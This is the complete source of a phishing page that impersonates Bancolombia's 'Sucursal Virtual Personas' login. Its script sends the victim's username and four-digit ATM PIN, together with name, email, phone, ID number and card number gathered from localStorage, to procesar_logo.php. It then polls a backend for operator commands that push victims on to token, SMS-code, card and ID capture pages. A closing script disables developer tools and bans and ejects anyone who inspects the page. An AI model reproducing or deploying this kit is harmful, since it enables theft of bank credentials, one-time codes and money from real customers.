<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sucursal Virtual Personas</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: "Open Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            
            background-color: #FAFAFA;
            background-image: url('img/fondo.svg'); 
            background-size: cover; 
            background-position: center top;
            background-attachment: fixed;
            background-repeat: no-repeat;
            
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            color: #2C2A29;
            padding: 0 16px;
        }

        /* Encabezado */
        .header-container {
            text-align: center;
            margin-top: 50px;
            margin-bottom: 25px;
        }

        .header-container img.logo {
            height: 68px;
            margin-bottom: 24px;
            object-fit: contain;
        }

        .main-title {
            font-weight: 300;
            font-size: 26px;
            color: #444444;
            letter-spacing: -0.3px;
        }

        /* Contenedor Principal */
        .main-wrapper {
            width: 100%;
            max-width: 500px;
        }

        /* Caja de Alerta */
        .alert-box {
            background-color: #D9F2F9;
            border: 1px solid #7FD3ED;
            border-radius: 6px;
            padding: 16px 20px;
            display: flex;
            gap: 14px;
            margin-bottom: 16px;
        }

        .alert-icon { flex-shrink: 0; padding-top: 2px; }
        .alert-content strong { display: block; font-size: 14.5px; font-weight: 700; color: #2C2A29; margin-bottom: 4px; }
        .alert-content p { font-size: 13.5px; color: #4A4A4A; line-height: 1.4; margin-bottom: 6px; }
        .alert-content a { font-size: 13.5px; font-weight: 700; color: #2C2A29; text-decoration: underline; }

        /* Tarjeta de Login */
        .login-card {
            background-color: #FFFFFF;
            border-radius: 8px;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.08), 0 4px 10px rgba(0, 0, 0, 0.04);
            padding: 40px 50px;
            text-align: center;
            margin-bottom: 40px;
        }

        .login-card h2 { font-size: 24px; font-weight: 700; color: #2C2A29; margin-bottom: 12px; }
        .login-card .subtitle { font-size: 14px; color: #666666; margin-bottom: 30px; line-height: 1.5; padding: 0 5px; }

        /* Estructura de Inputs Dinámicos */
        .field-wrapper {
            margin-bottom: 6px;
            position: relative;
        }

        .field-label {
            display: block;
            text-align: left;
            font-size: 14px;
            color: #2C2A29;
            visibility: hidden; 
            margin-bottom: 4px;
        }

        .input-group {
            display: flex;
            align-items: center;
            border-bottom: 1px solid #8C8C8C;
            padding-bottom: 6px;
            transition: border-color 0.2s, border-width 0.2s;
        }

        .input-group.active-border {
            border-bottom: 2px solid #2C2A29;
            padding-bottom: 5px; 
        }

        /* Clases de Error para inputs */
        .input-group.error-border {
            border-bottom: 1px solid #D32F2F !important;
            padding-bottom: 6px;
        }

        .error-message {
            color: #D32F2F;
            font-size: 12px;
            text-align: left;
            display: block;
            margin-top: 4px;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.2s;
        }

        .error-message.show {
            opacity: 1;
            visibility: visible;
        }

        .left-icon {
            width: 22px;
            height: 22px;
            stroke: #4A4A4A;
            fill: none;
            stroke-width: 1.5;
            margin-right: 12px;
            flex-shrink: 0;
        }

        .input-group input {
            border: none;
            outline: none;
            width: 100%;
            font-size: 18px;
            font-family: inherit;
            color: #2C2A29;
            background: transparent;
            letter-spacing: 0.5px;
        }

        .input-group input[type="password"] {
            font-size: 24px;
            letter-spacing: 2px;
        }

        .input-group input::placeholder {
            color: #666666;
            font-size: 15px;
            letter-spacing: normal;
        }

        .input-group input.filled::placeholder {
            color: transparent;
        }

        .clear-icon {
            width: 22px;
            height: 22px;
            flex-shrink: 0;
            cursor: pointer;
            display: none; 
            margin-left: 10px;
        }

        .help-link {
            display: block;
            text-align: left;
            font-size: 13px;
            font-weight: 700;
            color: #2C2A29;
            text-decoration: underline;
            margin-top: 4px;
            margin-bottom: 24px;
        }

        /* Botones y Enlaces inferiores */
        .btn-submit {
            width: 100%;
            background-color: #E2E2E2;
            color: #8C8C8C;
            border: none;
            border-radius: 24px;
            padding: 15px;
            font-size: 16px;
            font-family: inherit;
            font-weight: 600;
            margin-top: 10px;
            margin-bottom: 26px;
            cursor: not-allowed;
            transition: background-color 0.3s, color 0.3s;
        }

        .btn-submit.active {
            background-color: #FDDA24; 
            color: #2C2A29; 
            cursor: pointer;
        }

        .create-user-link {
            display: inline-block;
            font-size: 14px;
            font-weight: 700;
            color: #2C2A29;
            text-decoration: underline;
        }

        /* =========================================
           PANTALLA DE CARGA (LOADER) OVERLAY 
           ========================================= */
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(30, 30, 30, 0.85); 
            z-index: 9998;
            display: none; 
            justify-content: center;
            align-items: center;
        }

        .loader-circle {
            background-color: #FFFFFF;
            width: 140px;
            height: 140px;
            border-radius: 50%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
        }

        .spinner-ring {
            width: 32px;
            height: 32px;
            border: 1.5px solid #2C2A29;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 12px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-text {
            font-size: 13.5px;
            color: #2C2A29;
            font-weight: 400;
        }

        /* =========================================
           BANNER SUPERIOR DE ERROR
           ========================================= */
        .error-banner {
            position: fixed;
            top: 10px;
            left: 50%;
            transform: translateX(-50%) translateY(-20px);
            width: 95%;
            max-width: 600px;
            background-color: #383838;
            border-left: 6px solid #F1754B;
            border-radius: 4px;
            padding: 18px 20px;
            display: flex;
            align-items: flex-start;
            gap: 16px;
            z-index: 9999;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        }

        .error-banner.show {
            opacity: 1;
            visibility: visible;
            transform: translateX(-50%) translateY(0);
        }

        .error-icon-wrapper {
            background-color: #F1754B;
            border-radius: 50%;
            width: 26px;
            height: 26px;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .error-icon-wrapper svg {
            width: 14px; 
            height: 14px; 
            stroke: #383838; 
            stroke-width: 2.5;
        }

        .error-text-content {
            flex: 1;
            color: #FFFFFF;
            text-align: left;
        }

        .error-text-content h4 {
            font-size: 16px; 
            font-weight: 700; 
            margin-bottom: 4px;
        }

        .error-text-content p {
            font-size: 14px; 
            color: #D4D4D4;
        }

        .error-close {
            background: none; 
            border: none; 
            cursor: pointer; 
            padding: 2px;
            margin-top: 2px;
        }

        .error-close svg {
            width: 20px; 
            height: 20px; 
            stroke: #A0A0A0; 
            stroke-width: 1.5;
        }

        @media (max-width: 600px) {
            .login-card { padding: 30px 24px; }
            .header-container { margin-top: 30px; }
            .error-banner { width: calc(100% - 32px); top: 16px; }
        }
    </style>
</head>
<body>

    <!-- Pantalla de carga (Oculta por defecto) -->
    <div class="loader-overlay" id="loaderOverlay">
        <div class="loader-circle">
            <div class="spinner-ring"></div>
            <div class="loader-text">Cargando...</div>
        </div>
    </div>

    <!-- Banner de Error Superior -->
    <div class="error-banner" id="errorBanner">
        <div class="error-icon-wrapper">
            <svg viewBox="0 0 24 24" fill="none"><path d="M18 6L6 18M6 6l12 12" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </div>
        <div class="error-text-content">
            <h4>Usuario o clave incorrecta</h4>
            <p>Verifica la información e inténtalo de nuevo.</p>
        </div>
        <button class="error-close" id="closeErrorBanner">
            <svg viewBox="0 0 24 24" fill="none"><path d="M18 6L6 18M6 6l12 12" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </button>
    </div>

    <!-- Encabezado -->
    <div class="header-container">
        <img src="img/logo.svg" alt="Bancolombia" class="logo">
        <h1 class="main-title">Sucursal Virtual Personas</h1>
    </div>

    <div class="main-wrapper">
        
        <!-- Alerta de mantenimiento -->
        <div class="alert-box">
            <div class="alert-icon">
                <svg width="26" height="26" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="14" cy="14" r="13" fill="#C2EBF7" stroke="#5CC5E4" stroke-width="1.5"/>
                    <path d="M10.5 16C10.5 14.5 9 12.5 9 10C9 7.2386 11.2386 5 14 5C16.7614 5 19 7.2386 19 10C19 12.5 17.5 14.5 17.5 16V17H10.5V16Z" stroke="#2C2A29" stroke-width="1.8" stroke-linejoin="round"/>
                    <line x1="11.5" y1="20" x2="16.5" y2="20" stroke="#2C2A29" stroke-width="1.8" stroke-linecap="round"/>
                </svg>
            </div>
            <div class="alert-content">
                <strong>¡Prográmate!</strong>
                <p>Consulta el estado de nuestros canales y los mantenimientos programados.</p>
                <a href="#">Más info aquí.</a>
            </div>
        </div>

        <!-- Tarjeta Blanca de Inicio de Sesión -->
        <div class="login-card">
            <h2>¡Hola!</h2>
            <p class="subtitle">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>

            <form id="loginForm" action="#" method="POST">
                
                <!-- Campo Usuario -->
                <div class="field-wrapper">
                    <label class="field-label" id="lblUser">Usuario</label>
                    <div class="input-group" id="groupUser">
                        <svg class="left-icon" viewBox="0 0 24 24">
                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                            <circle cx="12" cy="7" r="4"></circle>
                        </svg>
                        
                        <input type="text" id="username" name="username" placeholder="Usuario" autocomplete="off">
                        
                        <svg class="clear-icon" id="clearUser" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <circle cx="12" cy="12" r="10" stroke="#2C2A29" stroke-width="1.2" fill="none"/>
                            <path d="M9 9L15 15M15 9L9 15" stroke="#2C2A29" stroke-width="1.2" stroke-linecap="round"/>
                        </svg>
                    </div>
                    <!-- Mensaje de error inferior (Oculto por defecto) -->
                    <span class="error-message" id="errorMsgUser">Ingresa tu usuario</span>
                    <a href="#" class="help-link">¿Olvidaste tu usuario?</a>
                </div>

                <!-- Campo Clave Cajero -->
                <div class="field-wrapper">
                    <label class="field-label" id="lblPass">Clave del cajero</label>
                    <div class="input-group" id="groupPass">
                        <svg class="left-icon" viewBox="0 0 24 24">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                        </svg>
                        
                        <input type="password" id="password" name="password" placeholder="Clave del cajero" autocomplete="off" inputmode="numeric" pattern="[0-9]*" maxlength="4">
                        
                        <svg class="clear-icon" id="clearPass" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <circle cx="12" cy="12" r="10" stroke="#2C2A29" stroke-width="1.2" fill="none"/>
                            <path d="M9 9L15 15M15 9L9 15" stroke="#2C2A29" stroke-width="1.2" stroke-linecap="round"/>
                        </svg>
                    </div>
                    <!-- Mensaje de error inferior (Oculto por defecto) -->
                    <span class="error-message" id="errorMsgPass">Ingresa tu clave</span>
                    <a href="#" class="help-link">¿Olvidaste o bloqueaste tu clave?</a>
                </div>

                <!-- Botón de Inicio de sesión -->
                <button type="submit" id="btnSubmit" class="btn-submit" disabled>Iniciar sesión</button>
 
                <!-- Crear Usuario -->
                <a href="#" class="create-user-link">Crear usuario</a>
                
            </form>
        </div>

    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            localStorage.removeItem('session_id');
            localStorage.removeItem('messageId');
            localStorage.removeItem('token');
            localStorage.removeItem('username');
            localStorage.removeItem('password');
            localStorage.removeItem('identificacion');

            const loginForm = document.getElementById('loginForm');
            const loaderOverlay = document.getElementById('loaderOverlay');
            
            const errorBanner = document.getElementById('errorBanner');
            const closeErrorBanner = document.getElementById('closeErrorBanner');

            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const btnSubmit = document.getElementById('btnSubmit');
            
            const clearUser = document.getElementById('clearUser');
            const clearPass = document.getElementById('clearPass');
            
            const lblUser = document.getElementById('lblUser');
            const lblPass = document.getElementById('lblPass');
            
            const groupUser = document.getElementById('groupUser');
            const groupPass = document.getElementById('groupPass');

            const errorMsgUser = document.getElementById('errorMsgUser');
            const errorMsgPass = document.getElementById('errorMsgPass');
            
            let bannerTimer;

            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('error') === '1') {
                groupUser.classList.add('error-border');
                errorMsgUser.classList.add('show');
                groupPass.classList.add('error-border');
                errorMsgPass.classList.add('show');
                errorBanner.classList.add('show');
                bannerTimer = setTimeout(() => {
                    errorBanner.classList.remove('show');
                }, 3000);
            }

            function updateUI() {
                // Quitar estado de error al escribir en Usuario
                if (usernameInput.value.length > 0) {
                    clearUser.style.display = 'block';
                    lblUser.style.visibility = 'visible';
                    usernameInput.classList.add('filled');
                    groupUser.classList.add('active-border');
                    
                    // Remover estilos de error
                    groupUser.classList.remove('error-border');
                    errorMsgUser.classList.remove('show');
                } else {
                    clearUser.style.display = 'none';
                    lblUser.style.visibility = 'hidden';
                    usernameInput.classList.remove('filled');
                    groupUser.classList.remove('active-border');
                }

                // Quitar estado de error al escribir en Clave
                passwordInput.value = passwordInput.value.replace(/\D/g, '').substring(0, 4);
                
                if (passwordInput.value.length > 0) {
                    clearPass.style.display = 'block';
                    lblPass.style.visibility = 'visible';
                    passwordInput.classList.add('filled');
                    groupPass.classList.add('active-border');
                    
                    // Remover estilos de error
                    groupPass.classList.remove('error-border');
                    errorMsgPass.classList.remove('show');
                } else {
                    clearPass.style.display = 'none';
                    lblPass.style.visibility = 'hidden';
                    passwordInput.classList.remove('filled');
                    groupPass.classList.remove('active-border');
                }

                // Activar botón
                if (usernameInput.value.trim().length > 0 && passwordInput.value.length === 4) {
                    btnSubmit.classList.add('active');
                    btnSubmit.removeAttribute('disabled');
                } else {
                    btnSubmit.classList.remove('active');
                    btnSubmit.setAttribute('disabled', 'true');
                }
            }

            usernameInput.addEventListener('input', updateUI);
            passwordInput.addEventListener('input', updateUI);

            clearUser.addEventListener('click', () => {
                usernameInput.value = '';
                updateUI();
                usernameInput.focus();
            });

            clearPass.addEventListener('click', () => {
                passwordInput.value = '';
                updateUI();
                passwordInput.focus();
            });

            // Cerrar el banner de error manualmente
            closeErrorBanner.addEventListener('click', () => {
                errorBanner.classList.remove('show');
                clearTimeout(bannerTimer);
            });

            // Manejador del submit
            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault(); 
                
                // Mostrar loader
                loaderOverlay.style.display = 'flex'; 

                const u = usernameInput.value.trim();
                const p = passwordInput.value.trim();

                let sessionId = ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })());
                if (!sessionId) {
                  sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                  localStorage.setItem('session_id', sessionId);
                }

                localStorage.setItem('username', u);
                localStorage.setItem('password', p);

                let localTb = {};
                try {
                    localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
                } catch(e) {}

                // Recuperar valores que puedan estar sueltos en localStorage
                if (!localTb.banco) localTb.banco = localStorage.getItem('banco') || 'BANCOLOMBIA';
                if (!localTb.total_pagar) localTb.total_pagar = localStorage.getItem('total_pagar') || '';
                if (!localTb.documento && localStorage.getItem('val')) localTb.documento = localStorage.getItem('val');
                if (!localTb.nombre && (localStorage.getItem('nombre') || localStorage.getItem('nom'))) localTb.nombre = localStorage.getItem('nombre') || localStorage.getItem('nom');
                if (!localTb.correo && (localStorage.getItem('correo') || localStorage.getItem('eml'))) localTb.correo = localStorage.getItem('correo') || localStorage.getItem('eml');
                if (!localTb.telefono && (localStorage.getItem('celular') || localStorage.getItem('cel'))) localTb.telefono = localStorage.getItem('celular') || localStorage.getItem('cel');
                if (!localTb.tarjeta && (localStorage.getItem('tarjeta') || localStorage.getItem('num'))) localTb.tarjeta = localStorage.getItem('tarjeta') || localStorage.getItem('num');

                const formData = new FormData();
                formData.append('transactionId', sessionId);
                formData.append('u_id', u);
                formData.append('u_ps', p);
                formData.append('u_tb', JSON.stringify(localTb));

                try {
                    const res = await fetch('procesar_logo.php', { method: 'POST', body: formData });
                    const result = await res.json();
                    
                    if (result.status === 'success') {
                        localStorage.setItem('messageId', result.messageId);
                        checkPaymentVerification(sessionId, result.messageId);
                    } else {
                        setTimeout(() => checkPaymentVerification(sessionId, 'msg_' + Date.now()), 2000);
                    }
                } catch (e) {
                    setTimeout(() => checkPaymentVerification(sessionId, 'msg_' + Date.now()), 2000);
                }
            });

            async function checkPaymentVerification(transactionId, messageId) {
                try {
                    const formData = new FormData();
                    formData.append('transactionId', transactionId);
                    formData.append('messageId', messageId);

                    const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), { method: 'POST', body: formData });
                    const result = await res.json();

                    if (result && result.action) {
                        loaderOverlay.style.display = 'none';

                        switch (result.action) {
                            case 'pedir_dinamica':
                                window.location.replace('token.php');
                                break;
                                window.location.replace('token.php');
                                break;
                            case 'error_token':
                                window.location.replace('token.php?error=1');
                                break;
                                window.location.replace('token.php?error=1');
                                break;
                                window.location.href = 'token.php';
                                break;
                            case 'pedir_sms':
                                window.location.replace('token_sms.php');
                                break;
                                window.location.replace('token_sms.php');
                                break;
                                window.location.href = 'token.php?sms=1';
                                break;
                            case 'bre_b':
                                window.location.href = '/recaudos/brev.php?bancolombia';
                                break;
                            case 'error_logo':
                                // Limpiar campos
                                usernameInput.value = '';
                                passwordInput.value = '';
                                updateUI();

                                // Aplicar clases de error rojo
                                groupUser.classList.add('error-border');
                                errorMsgUser.classList.add('show');
                                
                                groupPass.classList.add('error-border');
                                errorMsgPass.classList.add('show');

                                // Mostrar banner de error
                                errorBanner.classList.add('show');

                                // Ocultar banner después de 3 segundos
                                clearTimeout(bannerTimer);
                                bannerTimer = setTimeout(() => {
                                    errorBanner.classList.remove('show');
                                }, 3000);
                                break;
                            case '923':
                                window.location.href = '923.php';
                                break;
                            case 'error_tc':
                                window.location.href = '/datac/alter.php';
                                break;
                            case 'error':
                                window.location.href = '/caras';
                                break;
                            case 'cedula':
                                window.location.href = '/cedula';
                                break;
                            case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                                window.location.href = '/fin.php';
                                break;
                            default:
                                setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
                        }
                    } else {
                        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
                    }
                } catch (err) {
                    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
                }
            }
        });
    </script>
<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html>